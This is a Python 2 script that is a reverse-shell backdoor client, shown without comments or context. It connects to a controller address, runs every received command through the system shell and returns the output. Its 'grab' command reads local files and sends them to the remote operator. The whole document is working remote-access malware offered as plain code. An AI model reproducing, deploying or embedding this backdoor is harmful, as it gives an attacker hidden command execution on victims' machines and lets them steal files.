import socket
from subprocess import PIPE, Popen
import os

server_ip = '127.0.0.1'
server_port = 8080

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find out the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))
    while True:
        command = s.recv(1024)
        if 'terminate' in command:
            s.close()
            break
        elif 'grab' in command:
            grab, path = command.split('*')
            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass
        else:
            CMD = Popen(command, shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
def main():
    connect()
main()
